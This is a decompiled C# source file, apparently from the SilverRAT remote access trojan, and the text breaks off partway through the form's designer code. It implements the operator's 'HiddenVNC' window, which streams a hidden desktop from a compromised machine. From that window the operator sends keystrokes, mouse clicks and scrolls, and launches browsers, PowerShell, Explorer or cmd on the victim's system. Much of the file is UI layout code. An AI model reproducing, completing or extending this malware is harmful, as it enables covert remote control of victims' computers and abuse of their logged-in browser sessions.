using Bunifu.Framework.UI;
using Bunifu.UI.WinForms;
using Guna.UI2.WinForms;
using SilverRAT.Connection;
using SilverRAT.Handle_Packet;
using SilverRAT.MessagePack;
using SilverRAT.StreamLibrary;
using SilverRAT.StreamLibrary.UnsafeCodecs;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace SilverRAT.Forms;

public class HiddenVNC : Form
{
    public int FPS = 0;

    public Stopwatch sw = Stopwatch.StartNew();

    public IUnsafeCodec decoder = new UnsafeStreamCodec(60);

    public Size rdSize;

    public object syncPicbox = new object();

    private IContainer components = null;

    private BunifuElipse FormElipse;

    private BunifuDragControl FormDragControl1;

    public System.Windows.Forms.Timer Timer1;

    private Panel panelForm;

    public BunifuLabel FPSinfo;

    private Panel panel1;

    public PictureBox WaitRDP;

    private Panel PanelMune;

    public BunifuLabel SizeScreen;

    public BunifuTextBox ScreenY;

    public BunifuTextBox ScreenX;

    private BunifuCheckBox EnabledResize;

    private Label TxDelay;

    private Label MuneClose;

    internal Guna2HtmlLabel ValueQuality;

    public Guna2TrackBar QualityTrackBar;

    private BunifuLabel bunifuLabel17;

    public Guna2GradientButton Power;

    public PictureBox ViewerBox;

    private Guna2ResizeBox FormResizeBox1;

    public BunifuLoader LoaderConnect;

    private Guna2GradientButton ButtonMune;

    private Guna2CircleButton ButtClose;

    private Guna2CircleButton ButtionMinimized;

    private Guna2CircleButton ButtonMaximized;

    private BunifuLabel UserIdInfo;

    private BunifuLabel bunifuLabel1;

    private BunifuPanel PanelBottom;

    private BunifuPanel PanelLeft;

    private BunifuPanel PanelTOP;

    private BunifuPanel PanelRight;

    public BunifuLabel Logs;

    private BunifuPanel PanelTitle;

    private PictureBox ImageLogo;

    private System.Windows.Forms.Timer Timer2;

    public Guna2GradientButton OpenCustom;

    public Guna2GradientButton RunApps;

    public Bunifu.UI.WinForms.BunifuDropdown ListApps;

    private BunifuCheckBox bunifuCheckBox_0;

    private Label label3;

    public Bitmap Logo { get; set; }

    public FormSilver F { get; set; }

    internal Clients ParentClient { get; set; }

    internal Clients Client { get; set; }

    public string ScreenPath { get; set; }

    public Image GetImage { get; set; }

    private bool Bool_1 { get; set; }

    private bool Bool_2 { get; set; }

    private int Int_0 { get; set; }

    public HiddenVNC()
    {
        InitializeComponent();
        base.MouseWheel += MyMouseWheel;
        MinimumSize = base.Size;
    }

    public void KDW(object sender, KeyPressEventArgs e)
    {
        try
        {
            ViewerBox.Focus();
            if (Power.Text == "Stop" && ViewerBox.Image != null)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "keyboardClick";
                msgPack.ForcePathObject("Key").AsString = Convert.ToBase64String(Encoding.UTF8.GetBytes(e.KeyChar.ToString()));
                msgPack.ForcePathObject("KeyDown").SetAsBoolean(bVal: true);
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            }
        }
        catch
        {
        }
    }

    private void HiddenVNC_Load(object sender, EventArgs e)
    {
        try
        {
            string userIDClient = Packet.GetUserIDClient(ParentClient.DGV);
            UserIdInfo.Text = userIDClient;
            PictureBox viewerBox = ViewerBox;
            lock (viewerBox)
            {
                Control viewerBox2 = ViewerBox;
                viewerBox2.KeyPress += KDW;
            }
        }
        catch
        {
            UserIdInfo.Text = "Not Found!";
        }
        try
        {
            FormElipse.ElipseRadius = Settings.CurvatureForm;
            if (Settings.EnableEdgecurvatureForm)
            {
                PanelLeft.BackgroundColor = Settings.ColorCurvatureForm;
                PanelTOP.BackgroundColor = Settings.ColorCurvatureForm;
                PanelBottom.BackgroundColor = Settings.ColorCurvatureForm;
                PanelRight.BackgroundColor = Settings.ColorCurvatureForm;
            }
            else
            {
                PanelLeft.Visible = false;
                PanelTOP.Visible = false;
                PanelBottom.Visible = false;
                PanelRight.Visible = false;
            }
            if (Logo != null)
            {
                ImageLogo.Image = Logo;
            }
        }
        catch
        {
            return;
        }
        ListApps.SelectedIndex = 6;
    }

    private void HiddenVNC_Shown(object sender, EventArgs e)
    {
        Program.Silver.TransitionShowng.ShowSync(panelForm);
    }

    private void QualityTrackBar_Scroll(object sender, ScrollEventArgs e)
    {
        ValueQuality.Text = QualityTrackBar.Value + "% Quality";
    }

    private void EnabledResize_CheckedChanged(object sender, BunifuCheckBox.CheckedChangedEventArgs e)
    {
        if (EnabledResize.Checked)
        {
            ScreenX.Enabled = true;
            ScreenY.Enabled = true;
        }
        else
        {
            ScreenX.Enabled = false;
            ScreenY.Enabled = false;
        }
    }

    private void MuneClose_Click(object sender, EventArgs e)
    {
        Program.Silver.TransitionHiddeng.HideSync(PanelMune);
    }

    private void ButtonMune_Click(object sender, EventArgs e)
    {
        if (!PanelMune.Visible)
        {
            Program.Silver.TransitionShowng.ShowSync(PanelMune);
        }
    }

    private void ButtonMaximized_Click(object sender, EventArgs e)
    {
        if (base.WindowState != FormWindowState.Maximized)
        {
            base.WindowState = FormWindowState.Maximized;
        }
        else if (base.WindowState == FormWindowState.Maximized)
        {
            base.WindowState = FormWindowState.Normal;
        }
    }

    private void ButtionMinimized_Click(object sender, EventArgs e)
    {
        if (base.WindowState != FormWindowState.Minimized)
        {
            base.WindowState = FormWindowState.Minimized;
        }
    }

    private void ButtClose_Click(object sender, EventArgs e)
    {
        Close();
    }

    private void HiddenVNC_FormClosing(object sender, FormClosingEventArgs e)
    {
        try
        {
            Program.Silver.TransitionHiddeng.HideSync(panelForm);
            ThreadPool.QueueUserWorkItem(delegate
            {
                Client?.Disconnected();
            });
        }
        catch
        {
        }
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
        if (!ParentClient.TcpClient.Connected || !Client.TcpClient.Connected)
        {
            ThreadPool.QueueUserWorkItem(delegate
            {
                Client?.Disconnected();
            });
            Close();
        }
    }

    private void Power_Click(object sender, EventArgs e)
    {
        try
        {
            if (Power.Text == "Start")
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "Start";
                msgPack.ForcePathObject("Quality").AsInteger = Convert.ToInt32(QualityTrackBar.Value.ToString());
                msgPack.ForcePathObject("X").AsInteger = Convert.ToInt32(ScreenX.Text.ToString());
                msgPack.ForcePathObject("Y").AsInteger = Convert.ToInt32(ScreenY.Text.ToString());
                msgPack.ForcePathObject("Resize").AsString = EnabledResize.Checked.ToString();
                decoder = new UnsafeStreamCodec(Convert.ToInt32(QualityTrackBar.Value));
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
                QualityTrackBar.Enabled = false;
                EnabledResize.Enabled = false;
                ScreenX.Enabled = false;
                ScreenY.Enabled = false;
                Power.Text = "Started...";
                Power.Enabled = false;
            }
            else
            {
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Packet").AsString = "Stop";
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack2.Encode2Bytes());
                QualityTrackBar.Enabled = true;
                EnabledResize.Enabled = true;
                ScreenX.Enabled = true;
                ScreenY.Enabled = true;
                Power.Text = "Stoped...";
                Power.Enabled = false;
            }
        }
        catch
        {
        }
    }

    private void ViewerBox_MouseDown(object sender, MouseEventArgs e)
    {
        ViewerBox.Focus();
        if (!(Power.Text == "Stop") || ViewerBox.Image == null || !ViewerBox.ContainsFocus)
        {
            return;
        }
        Point point = new Point(e.X * rdSize.Width / ViewerBox.Width, e.Y * rdSize.Height / ViewerBox.Height);
        if (Bool_1)
        {
            Bool_1 = false;
            Timer2.Start();
        }
        else if (Int_0 < SystemInformation.DoubleClickTime)
        {
            Bool_2 = true;
        }
        if (Bool_2)
        {
            if (e.Button == MouseButtons.Left)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "DoubleClick";
                msgPack.ForcePathObject("X").AsString = point.X.ToString();
                msgPack.ForcePathObject("Y").AsString = point.Y.ToString();
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
                return;
            }
        }
        else if (e.Button == MouseButtons.Left)
        {
            MsgPack msgPack2 = new MsgPack();
            msgPack2.ForcePathObject("Packet").AsString = "LeftDown";
            msgPack2.ForcePathObject("X").AsString = point.X.ToString();
            msgPack2.ForcePathObject("Y").AsString = point.Y.ToString();
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack2.Encode2Bytes());
        }
        if (e.Button == MouseButtons.Right)
        {
            MsgPack msgPack3 = new MsgPack();
            msgPack3.ForcePathObject("Packet").AsString = "RightDown";
            msgPack3.ForcePathObject("X").AsString = point.X.ToString();
            msgPack3.ForcePathObject("Y").AsString = point.Y.ToString();
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack3.Encode2Bytes());
        }
    }

    private void ViewerBox_MouseMove(object sender, MouseEventArgs e)
    {
        ViewerBox.Focus();
        if (Power.Text == "Stop" && ViewerBox.Image != null && ViewerBox.ContainsFocus)
        {
            Point point = new Point(e.X * rdSize.Width / ViewerBox.Width, e.Y * rdSize.Height / ViewerBox.Height);
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "MoveCursor";
            msgPack.ForcePathObject("X").AsString = point.X.ToString();
            msgPack.ForcePathObject("Y").AsString = point.Y.ToString();
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
    }

    private void ViewerBox_MouseUp(object sender, MouseEventArgs e)
    {
        ViewerBox.Focus();
        if (Power.Text == "Stop" && ViewerBox.Image != null && ViewerBox.ContainsFocus)
        {
            Point point = new Point(e.X * rdSize.Width / ViewerBox.Width, e.Y * rdSize.Height / ViewerBox.Height);
            if (e.Button == MouseButtons.Left)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "LeftUp";
                msgPack.ForcePathObject("X").AsString = point.X.ToString();
                msgPack.ForcePathObject("Y").AsString = point.Y.ToString();
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            }
            if (e.Button == MouseButtons.Right)
            {
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Packet").AsString = "RightUp";
                msgPack2.ForcePathObject("X").AsString = point.X.ToString();
                msgPack2.ForcePathObject("Y").AsString = point.Y.ToString();
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack2.Encode2Bytes());
            }
        }
    }

    private void MyMouseWheel(object sender, MouseEventArgs e)
    {
        ViewerBox.Focus();
        if (Power.Text == "Stop" && ViewerBox.Image != null && ViewerBox.ContainsFocus)
        {
            Point point = new Point(e.X * rdSize.Width / ImageLogo.Width, e.Y * rdSize.Height / ImageLogo.Height);
            if (e.Delta < 0)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "ScrollDown";
                msgPack.ForcePathObject("X").AsString = point.X.ToString();
                msgPack.ForcePathObject("Y").AsString = point.Y.ToString();
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            }
            else
            {
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Packet").AsString = "ScrollUp";
                msgPack2.ForcePathObject("X").AsString = point.X.ToString();
                msgPack2.ForcePathObject("Y").AsString = point.Y.ToString();
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack2.Encode2Bytes());
            }
        }
    }

    private void Timer2_Tick(object sender, EventArgs e)
    {
        int int_ = Int_0;
        Int_0 = int_ + 100;
        if (Int_0 >= SystemInformation.DoubleClickTime)
        {
            Bool_1 = true;
            Bool_2 = false;
            Int_0 = 0;
        }
    }

    private string GetAppsKey(int Index)
    {
        if (ListApps.SelectedIndex == 0)
        {
            return "OpenChromeBrowser";
        }
        if (ListApps.SelectedIndex == 1)
        {
            return "OpenFireFoxBrowser";
        }
        if (ListApps.SelectedIndex == 2)
        {
            return "OpenBraveBrowser";
        }
        if (ListApps.SelectedIndex == 3)
        {
            return "OpenEdgeBrowser";
        }
        if (ListApps.SelectedIndex == 4)
        {
            return "OpenPowerShell";
        }
        if (ListApps.SelectedIndex == 5)
        {
            return "OpenExplorer";
        }
        if (ListApps.SelectedIndex == 6)
        {
            return "OpenCommandPrompt";
        }
        return "OpenCommandPrompt";
    }

    private void RunApps_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = GetAppsKey(ListApps.SelectedIndex);
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            RunApps.Enabled = false;
            ListApps.Enabled = false;
        }
        catch
        {
        }
    }

    private void OpenCustom_Click(object sender, EventArgs e)
    {
        try
        {
            if (!(Power.Text == "Stop"))
            {
                return;
            }
            string dwid = Guid.NewGuid().ToString();
            BeginInvoke((MethodInvoker)delegate
            {
                FvncCustomOpen fvncCustomOpen = (FvncCustomOpen)Application.OpenForms["Custom Open:" + dwid];
                if (fvncCustomOpen == null)
                {
                    using (fvncCustomOpen = new FvncCustomOpen(Client, UserIdInfo.Text))
                    {
                        fvncCustomOpen.Name = "Custom Open:" + dwid;
                        fvncCustomOpen.Text = "Custom Open";
                        fvncCustomOpen.ShowDialog();
                    }
                }
            });
        }
        catch
        {
        }
    }

    private void EnbledFPS_CheckedChanged(object sender, BunifuCheckBox.CheckedChangedEventArgs e)
    {
        if (bunifuCheckBox_0.Checked)
        {
            FPSinfo.Visible = false;
        }
        else
        {
            FPSinfo.Visible = true;
        }
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing && components != null)
        {
            components.Dispose();
        }
        base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
        this.components = new System.ComponentModel.Container();
        System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Forms.HiddenVNC));
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties2 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties3 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties4 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties5 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties6 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties7 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties8 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        this.FormElipse = new Bunifu.Framework.UI.BunifuElipse(this.components);
        this.panelForm = new System.Windows.Forms.Panel();
        this.Logs = new Bunifu.UI.WinForms.BunifuLabel();
        this.FPSinfo = new Bunifu.UI.WinForms.BunifuLabel();
        this.panel1 = new System.Windows.Forms.Panel();
        this.WaitRDP = new System.Windows.Forms.PictureBox();
        this.PanelMune = new System.Windows.Forms.Panel();
        this.bunifuCheckBox_0 = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.label3 = new System.Windows.Forms.Label();
        this.OpenCustom = new Guna.UI2.WinForms.Guna2GradientButton();
        this.RunApps = new Guna.UI2.WinForms.Guna2GradientButton();
        this.ListApps = new Bunifu.UI.WinForms.BunifuDropdown();
        this.SizeScreen = new Bunifu.UI.WinForms.BunifuLabel();
        this.ScreenY = new Bunifu.UI.WinForms.BunifuTextBox();
        this.ScreenX = new Bunifu.UI.WinForms.BunifuTextBox();
        this.EnabledResize = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.TxDelay = new System.Windows.Forms.Label();
        this.MuneClose = new System.Windows.Forms.Label();
        this.ValueQuality = new Guna.UI2.WinForms.Guna2HtmlLabel();
        this.QualityTrackBar = new Guna.UI2.WinForms.Guna2TrackBar();
        this.bunifuLabel17 = new Bunifu.UI.WinForms.BunifuLabel();
        this.Power = new Guna.UI2.WinForms.Guna2GradientButton();
        this.ViewerBox = new System.Windows.Forms.PictureBox();
        this.FormResizeBox1 = new Guna.UI2.WinForms.Guna2ResizeBox();
        this.PanelTitle = new Bunifu.UI.WinForms.BunifuPanel();
        this.LoaderConnect = new Bunifu.UI.WinForms.BunifuLoader();
        this.ButtonMune = new Guna.UI2.WinForms.Guna2GradientButton();
        this.ButtClose = new Guna.UI2.WinForms.Guna2CircleButton();
        this.ButtionMinimized = new Guna.UI2.WinForms.Guna2CircleButton();
        this.ButtonMaximized = new Guna.UI2.WinForms.Guna2CircleButton();
        this.UserIdInfo = new Bunifu.UI.WinForms.BunifuLabel();
        this.bunifuLabel1 = new Bunifu.UI.WinForms.BunifuLabel();
        this.ImageLogo = new System.Windows.Forms.PictureBox();
        this.PanelBottom = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelLeft = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelTOP = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelRight = new Bunifu.UI.WinForms.BunifuPanel();
        this.FormDragControl1 = new Bunifu.Framework.UI.BunifuDragControl(this.components);
        this.Timer1 = new System.Windows.Forms.Timer(this.components);
        this.Timer2 = new System.Windows.Forms.Timer(this.components);
        this.panelForm.SuspendLayout();
        this.panel1.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.WaitRDP).BeginInit();
        this.PanelMune.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.ViewerBox).BeginInit();
        this.PanelTitle.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.ImageLogo).BeginInit();
        base.SuspendLayout();
        this.FormElipse.ElipseRadius = 4;
        this.FormElipse.TargetControl = this.panelForm;
        this.panelForm.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.panelForm.BackColor = System.Drawing.Color.White;
        this.panelForm.Controls.Add(this.Logs);
        this.panelForm.Controls.Add(this.FPSinfo);
        this.panelForm.Controls.Add(this.panel1);
        this.panelForm.Controls.Add(this.FormResizeBox1);
        this.panelForm.Controls.Add(this.PanelTitle);
        this.panelForm.Controls.Add(this.PanelBottom);
        this.panelForm.Controls.Add(this.PanelLeft);
        this.panelForm.Controls.Add(this.PanelTOP);
        this.panelForm.Controls.Add(this.PanelRight);
        this.panelForm.Location = new System.Drawing.Point(12, 12);
        this.panelForm.Name = "panelForm";
        this.panelForm.Size = new System.Drawing.Size(576, 484);
        this.panelForm.TabIndex = 572;
        this.panelForm.Visible = false;
        this.Logs.AllowParentOverrides = false;
        this.Logs.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
        this.Logs.AutoEllipsis = false;
        this.Logs.BackColor = System.Drawing.Color.White;
        this.Logs.Cursor = System.Windows.Forms.Cursors.Default;
        this.Logs.CursorType = System.Windows.Forms.Cursors.Default;
        this.Logs.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.Logs.ForeColor = System.Drawing.Color.DarkGray;
        this.Logs.Location = new System.Drawing.Point(16, 441);
        this.Logs.Name = "Logs";
        this.Logs.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.Logs.Size = new System.Drawing.Size(9, 15);
        this.Logs.TabIndex = 608;
        this.Logs.Text = "...";
        this.Logs.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.Logs.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.FPSinfo.AllowParentOverrides = false;
        this.FPSinfo.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
        this.FPSinfo.AutoEllipsis = false;
        this.FPSinfo.BackColor = System.Drawing.Color.White;
        this.FPSinfo.Cursor = System.Windows.Forms.Cursors.Default;
        this.FPSinfo.CursorType = System.Windows.Forms.Cursors.Default;
        this.FPSinfo.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.FPSinfo.ForeColor = System.Drawing.Color.DarkGray;
        this.FPSinfo.Location = new System.Drawing.Point(16, 462);
        this.FPSinfo.Name = "FPSinfo";
        this.FPSinfo.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.FPSinfo.Size = new System.Drawing.Size(9, 15);
        this.FPSinfo.TabIndex = 602;
        this.FPSinfo.Text = "...";
        this.FPSinfo.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.FPSinfo.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.FPSinfo.Visible = false;
        this.panel1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.panel1.BackColor = System.Drawing.Color.Black;
        this.panel1.Controls.Add(this.WaitRDP);
        this.panel1.Controls.Add(this.PanelMune);
        this.panel1.Controls.Add(this.ViewerBox);
        this.panel1.Location = new System.Drawing.Point(16, 112);
        this.panel1.Name = "panel1";
        this.panel1.Size = new System.Drawing.Size(546, 321);
        this.panel1.TabIndex = 601;
        this.WaitRDP.Anchor = System.Windows.Forms.AnchorStyles.None;
        this.WaitRDP.BackColor = System.Drawing.Color.Black;
        this.WaitRDP.Image = (System.Drawing.Image)resources.GetObject("WaitRDP.Image");
        this.WaitRDP.Location = new System.Drawing.Point(186, 135);
        this.WaitRDP.Name = "WaitRDP";
        this.WaitRDP.Size = new System.Drawing.Size(100, 50);
        this.WaitRDP.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
        this.WaitRDP.TabIndex = 579;
        this.WaitRDP.TabStop = false;
        this.PanelMune.BackColor = System.Drawing.Color.White;
        this.PanelMune.Controls.Add(this.bunifuCheckBox_0);
        this.PanelMune.Controls.Add(this.label3);
        this.PanelMune.Controls.Add(this.OpenCustom);
        this.PanelMune.Controls.Add(this.RunApps);
        this.PanelMune.Controls.Add(this.ListApps);
        this.PanelMune.Controls.Add(this.SizeScreen);
        this.PanelMune.Controls.Add(this.ScreenY);
        this.PanelMune.Controls.Add(this.ScreenX);
        this.PanelMune.Controls.Add(this.EnabledResize);
        this.PanelMune.Controls.Add(this.TxDelay);
        this.PanelMune.Controls.Add(this.MuneClose);
        this.PanelMune.Controls.Add(this.ValueQuality);
        this.PanelMune.Controls.Add(this.QualityTrackBar);
        this.PanelMune.Controls.Add(this.bunifuLabel17);
        this.PanelMune.Controls.Add(this.Power);
        this.PanelMune.Dock = System.Windows.Forms.DockStyle.Right;
        this.PanelMune.Location = new System.Drawing.Point(292, 0);
        this.PanelMune.Name = "PanelMune";
        this.PanelMune.Size = new System.Drawing.Size(254, 321);
        this.PanelMune.TabIndex = 578;
        this.bunifuCheckBox_0.AllowBindingControlAnimation = true;
        this.bunifuCheckBox_0.AllowBindingControlColorChanges = false;
        this.bunifuCheckBox_0.AllowBindingControlLocation = true;
        this.bunifuCheckBox_0.AllowCheckBoxAnimation = true;
        this.bunifuCheckBox_0.AllowCheckmarkAnimation = true;
        this.bunifuCheckBox_0.AllowOnHoverStates = true;
        this.bunifuCheckBox_0.AutoCheck = true;
        this.bunifuCheckBox_0.BackColor = System.Drawing.Color.Transparent;
        this.bunifuCheckBox_0.BackgroundImage = (System.Drawing.Image)resources.GetObject("EnbledFPS.BackgroundImage");
        this.bunifuCheckBox_0.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.bunifuCheckBox_0.BindingControl = this.label3;
        this.bunifuCheckBox_0.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.bunifuCheckBox_0.BorderRadius = 6;
        this.bunifuCheckBox_0.Checked = true;
        this.bunifuCheckBox_0.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Checked;
        this.bunifuCheckBox_0.Cursor = System.Windows.Forms.Cursors.Hand;
        this.bunifuCheckBox_0.CustomCheckmarkImage = null;
        this.bunifuCheckBox_0.Location = new System.Drawing.Point(10, 253);
        this.bunifuCheckBox_0.MinimumSize = new System.Drawing.Size(17, 17);
        this.bunifuCheckBox_0.Name = "EnbledFPS";
        this.bunifuCheckBox_0.OnCheck.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.bunifuCheckBox_0.OnCheck.BorderRadius = 6;
        this.bunifuCheckBox_0.OnCheck.BorderThickness = 2;
        this.bunifuCheckBox_0.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.bunifuCheckBox_0.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.bunifuCheckBox_0.OnCheck.CheckmarkThickness = 2;
        this.bunifuCheckBox_0.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.bunifuCheckBox_0.OnDisable.BorderRadius = 6;
        this.bunifuCheckBox_0.OnDisable.BorderThickness = 2;
        this.bunifuCheckBox_0.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.bunifuCheckBox_0.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.bunifuCheckBox_0.OnDisable.CheckmarkThickness = 2;
        this.bunifuCheckBox_0.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        this.bunifuCheckBox_0.OnHoverChecked.BorderRadius = 6;
        this.bunifuCheckBox_0.OnHoverChecked.BorderThickness = 2;
        this.bunifuCheckBox_0.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.bunifuCheckBox_0.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.bunifuCheckBox_0.OnHoverChecked.CheckmarkThickness = 2;
        this.bunifuCheckBox_0.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        this.bunifuCheckBox_0.OnHoverUnchecked.BorderRadius = 6;
        this.bunifuCheckBox_0.OnHoverUnchecked.BorderThickness = 1;
        this.bunifuCheckBox_0.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.bunifuCheckBox_0.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.bunifuCheckBox_0.OnUncheck.BorderRadius = 6;
        this.bunifuCheckBox_0.OnUncheck.BorderThickness = 1;
        this.bunifuCheckBox_0.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.bunifuCheckBox_0.Size = new System.Drawing.Size(21, 21);
        this.bunifuCheckBox_0.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.bunifuCheckBox_0.TabIndex = 676;
        this.bunifuCheckBox_0.ThreeState = false;
        this.bunifuCheckBox_0.ToolTipText = null;
        this.bunifuCheckBox_0.CheckedChanged += new System.EventHandler<Bunifu.UI.WinForms.BunifuCheckBox.CheckedChangedEventArgs>(EnbledFPS_CheckedChanged);
        this.label3.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.label3.AutoSize = true;
        this.label3.BackColor = System.Drawing.Color.Transparent;
        this.label3.Cursor = System.Windows.Forms.Cursors.Hand;
        this.label3.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.label3.ForeColor = System.Drawing.Color.Black;
        this.label3.Location = new System.Drawing.Point(34, 257);
        this.label3.Name = "label3";
        this.label3.Size = new System.Drawing.Size(91, 15);
        this.label3.TabIndex = 675;
        this.label3.Text = "FPS info Disable";
        this.OpenCustom.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.OpenCustom.BackColor = System.Drawing.Color.White;
        this.OpenCustom.BorderRadius = 4;
        this.OpenCustom.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.OpenCustom.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.OpenCustom.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.OpenCustom.CheckedState.Parent = this.OpenCustom;
        this.OpenCustom.Cursor = System.Windows.Forms.Cursors.Hand;
        this.OpenCustom.CustomImages.Parent = this.OpenCustom;
        this.OpenCustom.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.OpenCustom.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.OpenCustom.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.OpenCustom.ForeColor = System.Drawing.Color.White;
        this.OpenCustom.HoverState.Parent = this.OpenCustom;
        this.OpenCustom.Location = new System.Drawing.Point(61, 207);
        this.OpenCustom.Name = "OpenCustom";
        this.OpenCustom.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.OpenCustom.PressedDepth = 50;
        this.OpenCustom.ShadowDecoration.Parent = this.OpenCustom;
        this.OpenCustom.Size = new System.Drawing.Size(97, 29);
        this.OpenCustom.TabIndex = 673;
        this.OpenCustom.Text = "Custom Open";
        this.OpenCustom.Click += new System.EventHandler(OpenCustom_Click);
        this.RunApps.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.RunApps.BackColor = System.Drawing.Color.White;
        this.RunApps.BorderRadius = 4;
        this.RunApps.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.RunApps.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.RunApps.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.RunApps.CheckedState.Parent = this.RunApps;
        this.RunApps.Cursor = System.Windows.Forms.Cursors.Hand;
        this.RunApps.CustomImages.Parent = this.RunApps;
